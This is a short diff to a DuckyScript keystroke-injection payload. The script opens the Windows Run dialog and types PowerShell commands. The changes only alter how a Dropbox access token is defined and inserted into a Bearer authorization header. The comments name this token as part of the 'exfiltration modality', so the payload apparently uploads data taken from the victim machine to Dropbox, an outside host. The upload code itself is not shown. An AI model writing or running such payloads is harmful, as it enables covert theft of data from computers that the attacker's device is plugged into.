@@ -15,7 +15,7 @@ REM     - Internet Connection
 
 
 REM You must define your Dropbox accessToken or modify the exfiltration modality.
-DEFINE DROPBOX_ACCESS_TOKEN example
+DEFINE #DROPBOX_ACCESS_TOKEN example
 
 GUI r
 DELAY 1000
@@ -30,10 +30,7 @@ STRINGLN
 END_STRINGLN
 
 REM Setting about exfiltration
-STRING $accessToken = "
-STRING DROPBOX_ACCESS_TOKEN
-STRING "
-ENTER
+STRINGLN $accessToken = "#DROPBOX_ACCESS_TOKEN"
 
 STRINGLN
     $authHeader = @{Authorization = "Bearer $accessToken"}
